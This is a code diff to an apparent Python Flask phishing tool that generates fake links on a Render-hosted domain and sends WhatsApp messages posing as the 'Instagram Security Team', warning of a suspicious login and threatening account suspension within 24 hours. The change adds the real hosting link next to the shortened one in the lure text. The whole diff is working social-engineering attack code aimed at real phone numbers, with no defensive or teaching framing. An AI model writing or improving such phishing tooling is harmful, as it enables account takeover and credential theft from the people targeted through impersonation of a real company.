@@ -214,13 +214,13 @@ def generate_fake_link():
     actual_link = f"https://demo-3.onrender.com/{random_string}"  # Updated with your Render URL
     return real_looking_link, shortened_link, actual_link, random_string
 
-def craft_phishing_message(shortened_link):
-    """Craft a convincing WhatsApp phishing message in English."""
+def craft_phishing_message(shortened_link, actual_link):
+    """Craft a convincing WhatsApp phishing message in English with the actual link."""
     message = f"""Hello,
 
 We detected a suspicious login attempt on your Instagram account. To avoid account suspension, please verify your identity using the link below within 24 hours:
 
-{shortened_link}
+{shortened_link} ({actual_link})
 
 Instagram Security Team"""
     return message
@@ -258,7 +258,7 @@ def send_message():
     """Handle phone number submission and send WhatsApp message."""
     target_phone = request.form.get('phone_number').strip()
     real_looking_link, shortened_link, actual_link, path = generate_fake_link()
-    phishing_message = craft_phishing_message(shortened_link)
+    phishing_message = craft_phishing_message(shortened_link, actual_link)
     
     # Send the message
     success, error_message = send_whatsapp_message(target_phone, phishing_message)
